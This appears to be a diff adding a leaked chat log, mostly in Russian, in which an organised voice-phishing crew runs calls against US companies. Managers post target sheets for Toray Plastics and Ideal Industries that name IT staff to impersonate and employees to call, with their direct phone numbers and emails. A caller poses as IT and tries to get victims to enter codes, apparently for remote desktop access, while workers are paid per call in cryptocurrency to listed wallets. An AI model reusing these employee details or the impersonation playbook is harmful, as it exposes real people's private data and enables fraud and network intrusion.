+[2024-04-05 19:35:52] @arslanshabbirmalik:matrix.org: Thank you madam. Your appreciation means a lot to me.
+Madam, I always try to be a good employee.
+I hope I shall be working for you forever.
+You are kind, good hearted.
+
+Thank you
+. God bless you. Wish you a good evening. 🤗🫡💚❤️
+--------------------
+[2024-04-05 19:36:00] @iamnurnazarov:matrix.org: -do we work with somebody else outside of the country for cybersecurity? -no -for callcenter or anything? -ok, somebody who called me wants me to type in *not understandable* -so they can remote me my dekstop? -to help out of the problem?
+--------------------
+[2024-04-05 19:36:14] @iamnurnazarov:matrix.org: > <@manager880:colorado.su> и передать сюда свою интерпретацию
+
+некоторые части не отчетливо слышно
+--------------------
+[2024-04-05 19:36:15] @manager880:colorado.su: > outside of the country
+--------------------
+[2024-04-05 19:36:34] @iamnurnazarov:matrix.org: > <@manager880:colorado.su> есть помоему какойто устоявшийся список соответствий, который используется в таких случаях
+
+да, возьму список
+--------------------
+[2024-04-05 19:36:45] @manager880:colorado.su: > <@manager880:colorado.su> > outside of the country
+
+вот это конечно интересно
+--------------------
+[2024-04-05 19:36:53] @manager880:colorado.su: это она по акценту интересно поняла
+--------------------
+[2024-04-05 19:36:59] @manager880:colorado.su: или по callerID
+
+--------------------
+[2024-04-05 19:37:11] @manager361:colorado.su: последниее 4 номера сечас
+--------------------
+[2024-04-05 19:37:13] @manager361:colorado.su: и закончим
+--------------------
+[2024-04-05 19:37:28] @iamnurnazarov:matrix.org: в зойпере показывает откуда звонит абонент?
+--------------------
+[2024-04-05 19:37:30] @manager361:colorado.su: * последниее 4 номера сейчас
+--------------------
+[2024-04-05 19:37:34] @iamnurnazarov:matrix.org: именно по ip
+--------------------
+[2024-04-05 19:37:49] @manager880:colorado.su: Sometimes you're even too nice, ahahahaha.
+--------------------
+[2024-04-05 19:38:22] @manager880:colorado.su: мы звоним по sip
+--------------------
+[2024-04-05 19:38:35] @manager880:colorado.su: все что по интернету - идет только до серверов задарма
+--------------------
+[2024-04-05 19:38:42] @manager880:colorado.su: дальше это как обычный телефонный звонок
+--------------------
+[2024-04-05 19:38:45] @manager361:colorado.su: Toray (America)
+Description: Toray Plastics (America), Inc., is a subsidiary of Toray Industries Inc., the world leader in synthetic fibers and textiles, carbon fibers, plastics, chemicals, pharmaceuticals and high-performance films.
+
+HQ Location: 50 Belver Ave North Kingstown, Rhode Island 02852, United States
+Employees: 1,001 - 5,000
+Revenue: $766.4 Million
+Industry: Plastic, Packaging & Containers, Manufacturing
+
+HQ: (401)-294-4511
+
+
+—
+
+CALLLER
+Michael	Johnson
+Manager, Information Technology
+(401) 667-2240
+michael.johnson@toraytpa.com
+50 Belver Ave	North Kingstown	Rhode Island	2852	United States
+
+--------------------
+[2024-04-05 19:38:56] @iamnurnazarov:matrix.org: > <@manager880:colorado.su> дальше это как обычный телефонный звонок
+
+аа понял
+--------------------
+[2024-04-05 19:39:01] @manager361:colorado.su: 
+Diane Lacombe
+Customer Service and Inside Sales
+(401) 667-3055
+diane.lacombe@toraytpa.com
+560 Old Baptist Rd
+
+Dorothy Hendrickson
+Senior Credit & Collection Analyst
+(401) 667-2407
+dorothy.hendrickson@toraytpa.com
+50 Belver Ave
+
+--------------------
+[2024-04-05 19:39:05] @iamnurnazarov:matrix.org: > <@manager361:colorado.su> и закончим
+
+ок
+--------------------
+[2024-04-05 19:39:18] @manager361:colorado.su: напишу
+--------------------
+[2024-04-05 19:39:23] @arslanshabbirmalik:matrix.org: Haha, thank you madam.
+I am a peaceful person.
+I believe we all are connected and from the same stem.
+
+I live in Pakistan. Here life is bit difficult and different.
+--------------------
+[2024-04-05 19:40:08] @manager880:colorado.su: ты кстати впн используешь?
+--------------------
+[2024-04-05 19:40:10] @manager880:colorado.su: что я дал
+--------------------
+[2024-04-05 19:40:24] @iamnurnazarov:matrix.org: зойпер не работает с ним
+--------------------
+[2024-04-05 19:40:30] @iamnurnazarov:matrix.org: из-за этого пришлось выключить
+--------------------
+[2024-04-05 19:40:33] @manager880:colorado.su: давай заменим
+--------------------
+[2024-04-05 19:40:43] @manager880:colorado.su: сделаю другое гео
+--------------------
+[2024-04-05 19:40:45] @iamnurnazarov:matrix.org: та же прога?
+--------------------
+[2024-04-05 19:40:49] @manager880:colorado.su: да
+--------------------
+[2024-04-05 19:40:54] @manager880:colorado.su: казахстан будет работать
+--------------------
+[2024-04-05 19:40:54] @iamnurnazarov:matrix.org: ок
+--------------------
+[2024-04-05 19:40:58] @manager880:colorado.su: пойдет?
+--------------------
+[2024-04-05 19:41:04] @iamnurnazarov:matrix.org: да, без проблем
+--------------------
+[2024-04-05 19:41:44] @manager361:colorado.su: в 50 минут давай
+--------------------
+[2024-04-05 19:41:49] @iamnurnazarov:matrix.org: принял
+--------------------
+[2024-04-05 19:42:41] @iamnurnazarov:matrix.org: The Phonetic Alphabet List (aka Military or Letters Alphabet)
+
+A – Alpha. B – Bravo. C – Charlie. D – Delta. E – Echo. F – Foxtrot. G – Golf. H – Hotel. I – India.
+J – Juliett. K – Kilo. L – Lima. M – Mike. N – November. O – Oscar. P – Papa. Q – Quebec. ...
+S – Sierra. T – Tango. U – Uniform. V – Victor. W – Whiskey. X – X-Ray. Y – Yankee. Z – Zulu.
+--------------------
+[2024-04-05 19:43:27] @colin:talks.icu: > <@manager361:colorado.su> Diane Lacombe
+> Customer Service and Inside Sales
+> (401) 667-3055
+> diane.lacombe@toraytpa.com
+> 560 Old Baptist Rd
+>
+> Dorothy Hendrickson
+> Senior Credit & Collection Analyst
+> (401) 667-2407
+> dorothy.hendrickson@toraytpa.com
+> 50 Belver Ave
+
+Christopher Roy
+President, Chief Executive Offic
+--------------------
+[2024-04-05 19:43:36] @colin:talks.icu: вот в Toray CEO
+--------------------
+[2024-04-05 19:43:44] @iamnurnazarov:matrix.org: ty
+--------------------
+[2024-04-05 19:44:53] @arslanshabbirmalik:matrix.org: 🫡🫡🙏 please sir, if possible , consider it as a request.
+I am not a very privileged person.
+I am striving to make a good living.
+Please if it's not a burden to you. Pay me good with your own will.
+I shall be highly thankful to you.
+
+🫡🙏🫡🙏🫡🙏
+--------------------
+[2024-04-05 19:48:07] @manager880:colorado.su: Huh, Let's keep going, and it will become clearer how strong our cooperation will be.
+--------------------
+[2024-04-05 19:48:27] @manager880:colorado.su: > <@iamnurnazarov:matrix.org> The Phonetic Alphabet List (aka Military or Letters Alphabet)
+>
+>     A – Alpha. B – Bravo. C – Charlie. D – Delta. E – Echo. F – Foxtrot. G – Golf. H – Hotel. I – India.
+>     J – Juliett. K – Kilo. L – Lima. M – Mike. N – November. O – Oscar. P – Papa. Q – Quebec. ...
+>     S – Sierra. T – Tango. U – Uniform. V – Victor. W – Whiskey. X – X-Ray. Y – Yankee. Z – Zulu.
+
+да, я как раз про это говорил
+--------------------
+[2024-04-05 19:48:40] @manager880:colorado.su: но есть менее милитаризованный вариант кстати
+--------------------
+[2024-04-05 19:49:11] @iamnurnazarov:matrix.org: да, позже найду
+--------------------
+[2024-04-05 19:49:12] @manager880:colorado.su: на чет буквы Х кстати тоже тупка бывает, амеры произносят ее както поособенному
+--------------------
+[2024-04-05 19:49:34] @manager880:colorado.su: ты пока пристреливаешься, в любом случае
+--------------------
+[2024-04-05 19:49:39] @iamnurnazarov:matrix.org: думаю X-Ray сойдет
+--------------------
+[2024-04-05 19:49:40] @manager880:colorado.su: поэтому возможны какието промахи
+--------------------
+[2024-04-05 19:49:41] @manager880:colorado.su: НО
+--------------------
+[2024-04-05 19:50:01] @manager880:colorado.su: обязательно надо прорабатывать то, на чем ранее спотыкался
+--------------------
+[2024-04-05 19:50:12] @manager880:colorado.su: если тебе везде нужен СЕО - будет доставать
+--------------------
+[2024-04-05 19:50:27] @manager880:colorado.su: икс сказала
+--------------------
+[2024-04-05 19:50:29] @manager880:colorado.su: а там экс
+--------------------
+[2024-04-05 19:50:31] @manager880:colorado.su: чето такое
+--------------------
+[2024-04-05 19:50:33] @arslanshabbirmalik:matrix.org: Madam, you are love. 🤗❤️🤗.
+Madam, I know you are a very strong woman.
+This is why I am fully dedicated to your work.
+I believe opportunity can knock on anybody's door.
+
+May be because of you I could be the luckiest one.
+
+Madam, you always healthy happy and prosperous 😊
+--------------------
+[2024-04-05 19:50:51] @iamnurnazarov:matrix.org: хорошо, понял
+--------------------
+[2024-04-05 19:50:53] @iamnurnazarov:matrix.org: звоню
+--------------------
+[2024-04-05 19:53:28] @iamnurnazarov:matrix.org: проблема
+--------------------
+[2024-04-05 19:53:58] @iamnurnazarov:matrix.org: она с реальным мной в жизни говорила
+--------------------
+[2024-04-05 19:54:10] @iamnurnazarov:matrix.org: из-за этого hang up
+--------------------
+[2024-04-05 19:54:23] @iamnurnazarov:matrix.org: c майклом джонсоном
+--------------------
+[2024-04-05 19:54:37] @colin:talks.icu: > <@iamnurnazarov:matrix.org> она с реальным мной в жизни говорила
+
+ну бывает
+--------------------
+[2024-04-05 19:54:49] @colin:talks.icu: идем дальше
+--------------------
+[2024-04-05 19:55:03] @iamnurnazarov:matrix.org: я просто как помню вчера или позовчера их обзванивал
+--------------------
+[2024-04-05 19:55:21] @manager361:colorado.su: > <@iamnurnazarov:matrix.org> я просто как помню вчера или позовчера их обзванивал
+
+нет
+--------------------
+[2024-04-05 19:55:36] @iamnurnazarov:matrix.org: Дороти не помню
+--------------------
+[2024-04-05 19:56:00] @manager361:colorado.su: Обоим набрал да?
+--------------------
+[2024-04-05 19:56:00] @iamnurnazarov:matrix.org: Diane звонил вроде, может путаю
+--------------------
+[2024-04-05 19:56:08] @iamnurnazarov:matrix.org: > <@manager361:colorado.su> Обоим набрал да?
+
+звоню второй
+--------------------
+[2024-04-05 19:59:07] @iamnurnazarov:matrix.org: звонок оборвался, перезваниваю
+--------------------
+[2024-04-05 19:59:24] @colin:talks.icu: код если что нвый скину сейчас
+--------------------
+[2024-04-05 19:59:29] @iamnurnazarov:matrix.org: они с одного офиса с Diane?
+--------------------
+[2024-04-05 19:59:33] @colin:talks.icu: 9V3P1J
+--------------------
+[2024-04-05 19:59:41] @colin:talks.icu: * код если что новый скину сейчас
+--------------------
+[2024-04-05 19:59:52] @colin:talks.icu: > <@iamnurnazarov:matrix.org> они с одного офиса с Diane?
+
+судя по адресу нет
+--------------------
+[2024-04-05 20:00:00] @manager361:colorado.su: нет
+--------------------
+[2024-04-05 20:02:11] @iamnurnazarov:matrix.org: пздц
+--------------------
+[2024-04-05 20:02:21] @iamnurnazarov:matrix.org: Майкл Джонсон трубку взял
+--------------------
+[2024-04-05 20:02:35] @iamnurnazarov:matrix.org: я вырубил
+--------------------
+[2024-04-05 20:03:27] @manager361:colorado.su: Ага) прикольно
+--------------------
+[2024-04-05 20:03:40] @iamnurnazarov:matrix.org: 👍️
+--------------------
+[2024-04-05 20:06:04] @manager880:colorado.su: нормально
+--------------------
+[2024-04-05 20:06:12] @manager880:colorado.su: ну смотри
+--------------------
+[2024-04-05 20:06:48] @manager361:colorado.su: Ideal Industries
+Description: Ideal Industries, founded in 1916 and headquartered in Sycamore, Illinois, manufactures tools and supplies for professional electrical and data communications cable installation.
+
+HQ Location: 1375 Park Ave Sycamore, Illinois 60178, United States
+Employees: 1,001 - 5,000
+Revenue: $679.5 Million
+Industry: Test & Measurement Equipment, Manufacturing, Manufacturing | Building Materials, Electronics
+
+
+HQ Phone (815) 895-5181 (HQ)
+
+
+
+------- CALLLER
+Ted	Kowalczyk
+Information Technology Consultant
+(815) 895-1294
+ted.kowalczyk@idealindustries.com
+1375 Park Ave	Sycamore	Illinois	60178	United States
+
+OR
+
+Leilani	Askeland
+IT EDI Specialist
+(815) 895-1167
+leilani.askeland@idealindustries.com
+1375 Park Ave	Sycamore	Illinois	60178	United States
+
+OR
+
+Michelle	Fox
+Manager, Information Technology
+(815) 895-1344
+michelle.fox@idealindustries.com
+1375 Park Ave	Sycamore	Illinois	60178	United States
+
+
+
+
+---
+
+CALL TAKERS
+
+Julie Keizer
+Customer Service Coordinator
+(815) 899-7704
+julie.keizer@idealindustries.com
+1800 S Prairie Dr
+
+--------------------
+[2024-04-05 20:06:51] @manager361:colorado.su: последний
+--------------------
+[2024-04-05 20:07:18] @iamnurnazarov:matrix.org: принял
+--------------------
+[2024-04-05 20:07:50] @manager361:colorado.su: в 15 минут набирай
+--------------------
+[2024-04-05 20:07:56] @iamnurnazarov:matrix.org: хорошо
+--------------------
+[2024-04-05 20:09:47] @manager361:colorado.su: я прочитал как майкл
+--------------------
+[2024-04-05 20:09:51] @manager361:colorado.su: звони от мужика
+--------------------
+[2024-04-05 20:10:00] @iamnurnazarov:matrix.org: ок, от Теда наберу
+--------------------
+[2024-04-05 20:10:04] @manager361:colorado.su: ага
+--------------------
+[2024-04-05 20:10:11] @iamnurnazarov:matrix.org: * ок, от Тэда наберу
+--------------------
+[2024-04-05 20:13:38] @manager880:colorado.su: same wallet?
+--------------------
+[2024-04-05 20:14:03] @colin:talks.icu: Paul Miller: я думаю можно начинать.
+--------------------
+[2024-04-05 20:14:10] @iamnurnazarov:matrix.org: ок, звоню
+--------------------
+[2024-04-05 20:14:24] @colin:talks.icu: GZRJ7R
+--------------------
+[2024-04-05 20:14:53] @manager880:colorado.su: 0xdcb10300e7fc51d19c38b3254770f1d1a7448878
+--------------------
+[2024-04-05 20:15:22] @manager880:colorado.su: $30.6
+--------------------
+[2024-04-05 20:15:26] @manager880:colorado.su: total
+--------------------
+[2024-04-05 20:15:57] @arslanshabbirmalik:matrix.org: Yes madam. Actually in Pakistan. You know crypto currency is banned.
+
+I am arranging a friends's wallet in Canada because this way the money becomes legalized.
+--------------------
+[2024-04-05 20:16:09] @arslanshabbirmalik:matrix.org: Ok madam. 🤗🤗🤗🤗
+--------------------
+[2024-04-05 20:16:41] @arslanshabbirmalik:matrix.org: On Same wallet number you can send
+--------------------
+[2024-04-05 20:17:21] @manager880:colorado.su: 31 ✅
+--------------------
+[2024-04-05 20:17:30] @iamnurnazarov:matrix.org: она оказывается только с IT департментом говорила
+--------------------
+[2024-04-05 20:17:42] @manager880:colorado.su: не успели типо ?
+--------------------
+[2024-04-05 20:17:52] @arslanshabbirmalik:matrix.org: Thank you. 😊😊😊.
+Madam, do I need to come tomorrow ?
+--------------------
+[2024-04-05 20:18:04] @iamnurnazarov:matrix.org: да, походу заранее её набрали
+--------------------
+[2024-04-05 20:18:06] @manager880:colorado.su: no Only on monday
+--------------------
+[2024-04-05 20:18:08] @manager880:colorado.su: 10 am NY
+--------------------
+[2024-04-05 20:18:22] @manager880:colorado.su: thank you Arslan
+--------------------
+[2024-04-05 20:18:35] @manager880:colorado.su: and have a great weekend
+--------------------
+[2024-04-05 20:19:03] @arslanshabbirmalik:matrix.org: Received madam.
+Thank you.
+You too have fun. Wish you good night. Sweet dreams.
+Also to sir.
+--------------------
+[2024-04-05 20:19:40] @manager880:colorado.su: тогда все на сегодня
+--------------------
+[2024-04-05 20:19:46] @iamnurnazarov:matrix.org: хорошо
+--------------------
+[2024-04-05 20:20:00] @manager880:colorado.su: не вел у себя стату?
+--------------------
+[2024-04-05 20:20:37] @manager880:colorado.su: войс/недоступен
+и дозвоны/разговоры
+--------------------
+[2024-04-05 20:20:43] @manager880:colorado.su: по количеству
+--------------------
+[2024-04-05 20:20:51] @iamnurnazarov:matrix.org: нет, не вел
+--------------------
+[2024-04-05 20:20:53] @manager880:colorado.su: если нет - не страшно, посчитаем щас
+--------------------
+[2024-04-05 20:21:07] @manager880:colorado.su: но проще будет если с ПН начнешь помечать себе
+--------------------
+[2024-04-05 20:21:21] @iamnurnazarov:matrix.org: хорошо, дэшборд сделаю себе
+--------------------
+[2024-04-05 20:30:34] @manager880:colorado.su: 8 дозвонов
+--------------------
+[2024-04-05 20:30:50] @manager880:colorado.su: * 8 дозвонов х $5
+--------------------
+[2024-04-05 20:30:59] @manager880:colorado.su: 19 недозвонов x $0.5
+--------------------
+[2024-04-05 20:31:24] @manager880:colorado.su: 1 недокод, засчитаем как за половину, ты согласен? будет по честному?
+--------------------
+[2024-04-05 20:31:34] @iamnurnazarov:matrix.org: да, без проблем
+--------------------
+[2024-04-05 20:31:42] @manager880:colorado.su: $99,5
+--------------------
+[2024-04-05 20:31:58] @manager880:colorado.su: 0x08Df289E0e3b54064B3eF2d5ba6924F04DF6aEA4
+--------------------
+[2024-04-05 20:32:44] @iamnurnazarov:matrix.org: это получается с фиксом, да? систему просто до конца не понял
+--------------------
+[2024-04-05 20:33:02] @manager880:colorado.su: фикс платим вне зависимости от наличия заданий
+--------------------
+[2024-04-05 20:33:20] @manager880:colorado.su: если заданий будет выполнено на сумму бОльшую чем фикс
+--------------------
+[2024-04-05 20:33:26] @manager880:colorado.su: то оплата просто по кол-ву заданий
+--------------------
+[2024-04-05 20:33:37] @iamnurnazarov:matrix.org: аа, всё понял
+--------------------
+[2024-04-05 20:33:50] @iamnurnazarov:matrix.org: > <@manager880:colorado.su> 0x08Df289E0e3b54064B3eF2d5ba6924F04DF6aEA4
+
+да, тот же кошелек
+--------------------
+[2024-04-05 20:34:36] @manager880:colorado.su: т.е. можно предположить, что ты готов работать, но заданий нет по нашим какимто внутренним причинам
+--------------------
+[2024-04-05 20:34:51] @manager880:colorado.su: поскольку мы рассчитываем на тебя, то и платим фикс
+--------------------
+[2024-04-05 20:35:09] @iamnurnazarov:matrix.org: всё, понял вас
+--------------------
+[2024-04-05 20:35:53] @manager880:colorado.su: 100 ✅
+--------------------
+[2024-04-05 20:36:14] @manager880:colorado.su: спасибо
+за выходные найди пожалуйста время, чтобы поразмыслить над вторым скриптом
+--------------------
+[2024-04-05 20:36:47] @iamnurnazarov:matrix.org: > <@manager880:colorado.su> 100 ✅
+
+принял, спасибо
+--------------------
+[2024-04-05 20:36:57] @manager880:colorado.su: чтобы свою линию "атаки" укрепить, как миниум сократить моменты, где ты теряешься
+--------------------
+[2024-04-05 20:37:13] @iamnurnazarov:matrix.org: да, хорошо
+--------------------
+[2024-04-05 20:37:14] @manager880:colorado.su: можем записи скинуть
+--------------------
+[2024-04-05 20:37:15] @manager880:colorado.su: надо?
+--------------------
+[2024-04-05 20:37:31] @iamnurnazarov:matrix.org: у меня сохранено у себя, переслушаю
+--------------------
+[2024-04-05 20:38:01] @manager880:colorado.su: окей
+--------------------
+[2024-04-05 20:38:06] @manager880:colorado.su: тогда до понедельника
+--------------------
+[2024-04-05 20:38:18] @manager880:colorado.su: вайргард
+--------------------
+[2024-04-05 20:38:26] @manager880:colorado.su: давай в вск сделаем вечерком
+--------------------
+[2024-04-05 20:38:30] @manager880:colorado.su: а то я тоже побегу
+--------------------
+[2024-04-05 20:38:35] @iamnurnazarov:matrix.org: хорошо
+--------------------
+[2024-04-05 20:38:45] @iamnurnazarov:matrix.org: спасибо, всем хороших выходных
+--------------------
+[2024-04-05 20:42:09] @manager361:colorado.su: До понедельника👋
+--------------------
